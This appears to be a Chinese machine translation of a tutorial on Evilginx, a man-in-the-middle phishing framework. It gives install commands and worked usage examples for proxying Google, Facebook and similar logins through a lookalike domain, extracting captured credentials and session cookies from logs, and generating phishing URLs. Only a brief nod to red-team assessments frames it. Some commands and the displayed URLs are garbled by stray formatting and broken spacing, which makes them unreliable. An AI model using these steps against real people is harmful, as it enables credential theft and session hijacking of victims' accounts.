# evil ginx–针对网络钓鱼凭据和会话 Cookies 的 MITM 攻击框架

> 原文：<https://kalilinuxtutorials.com/evilginx-mitm-attack/>

Evilginx 是一个中间人攻击框架，用于任何 web 服务的钓鱼凭证和会话 cookies。它的核心运行在 Nginx HTTP server 上，利用`proxy_pass`和`sub_filter`代理和修改 HTTP 内容，同时拦截客户端和服务器之间的流量。

## **安装 evil ginx**

Evilginx 提供了一个安装脚本`install.sh`,它负责以一劳永逸的方式在任何 Debian wheezy/jessie 机器上安装整个软件包。

**亦读 [幽灵钓鱼者——无线&以太网攻击软件应用](https://kalilinuxtutorials.com/ghost-phisher-wireless-attack/)**

```
git clone https://github.com/kgretzky/evilginx
cd evilginx
chmod 700 install.sh
./install.sh
```

## **用法**

```
 `_ _       _            
           (_) |     (_)           
  _____   ___| | __ _ _ _ __ __  __
 / _ \ \ / / | |/ _` | | '_ \\ \/ /
|  __/\ V /| | | (_| | | | | |>  < 
 \___| \_/ |_|_|\__, |_|_| |_/_/\_\
                 __/ | 
 by @mrgretzky  |___/          v1.0

usage: evilginx.py [-h] {setup,parse,genurl} ...

positional arguments:
  {setup,parse,genurl}
    setup               Configure Evilginx.
    parse               Parse log file(s).
    genurl              Generate phishing URL.

optional arguments:
  -h, --help            show this help message and exit
```

## **设置**

使用`sites`目录中提供的 Evilginx 模板，启用或禁用用于 Nginx 服务器的站点配置。

```
usage: evilginx.py setup [-h] [-d DOMAIN] [-y]
                         (-l | --enable ENABLE | --disable DISABLE)

optional arguments:
  -h, --help            show this help message and exit
  -d DOMAIN, --domain DOMAIN
                        Your phishing domain.
  -y                    Answer all questions with 'Yes'.
  -l, --list            List available supported apps.
  --enable ENABLE       Enable following site by name.
  --disable DISABLE     Disable following site by name.
```

**列出可用的站点配置模板:**

```
python evilginx.py setup -l
```

**列出可用的支持站点:**
`**- dropbox (/root/evilginx/sites/dropbox/config)
subdomains: www** 
**- google (/root/evilginx/sites/google/config)
subdomains: accounts, ssl** 
**- facebook (/root/evilginx/sites/facebook/config)
subdomains: www, m** 
**- linkedin (/root/evilginx/sites/linkedin/config)
subdomains: www**`

**启用预先注册了钓鱼域名的谷歌钓鱼网站** `**not-really-google.com**` **:**

```
python evilginx.py** **setup --enable google -d not-really-google.com
```

**禁用 facebook 钓鱼网站:**

```
python evilginx.py setup --disable facebook
```

### **解析**

解析 Nginx 日志，提取截获的登录凭证和会话 cookies。默认情况下，日志保存在`evilginx.py`脚本所在的`logs`目录中。这可以在**设置**阶段启用自动解析后自动完成。

```
usage: evilginx.py parse [-h] -s SITE [--debug]

optional arguments:
  -h, --help            show this help message and exit
  -s SITE, --site SITE  Name of site to parse logs for ('all' to parse logs
                        for all sites).
  --debug               Does not truncate log file after parsing.
```

**只解析 google 站点的日志:**

```
python evilginx.py parse -s google
```

**解析所有可用站点的日志:**

```
python evilginx.py parse -s all
```

### **生成网址**

**生成可用于红队评估的网络钓鱼网址。**

```
usage: evilginx.py genurl [-h] -s SITE -r REDIRECT

optional arguments:
  -h, --help            show this help message and exit
  -s SITE, --site SITE  Name of site to generate link for.
  -r REDIRECT, --redirect REDIRECT
                        Redirect user to this URL after successful sign-in.
```

**Generate google phishing URL that will redirect victim to rick’roll video on successful login:**

```
python evilginx.py genurl -s google -r https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

**生成了以下网络钓鱼网址:**

*   **[https://accounts.not-really-google.com/ServiceLogin?RC = 0 ah r0 CHM 6 ly 93d 3c uew 91 dhviz 5 JB 20 VD 2 f 0y 2g _ DJ 1 kuxc 0 dzlxz 1 hjuq](https://accounts.not-really-google.com/ServiceLogin?rc=0aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g_dj1kUXc0dzlXZ1hjUQ)**
*   [**https://accounts . not-really-Google . com/sign in/v2/identifier？RC = 0 ah r0 CHM 6 ly 93d 3c uew 91 dhviz 5 JB 20 VD 2 f 0y 2g _ DJ 1 kuxc 0 dzlxz 1 hjuq**](https://accounts.not-really-google.com/signin/v2/identifier?rc=0aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g_dj1kUXc0dzlXZ1hjUQ)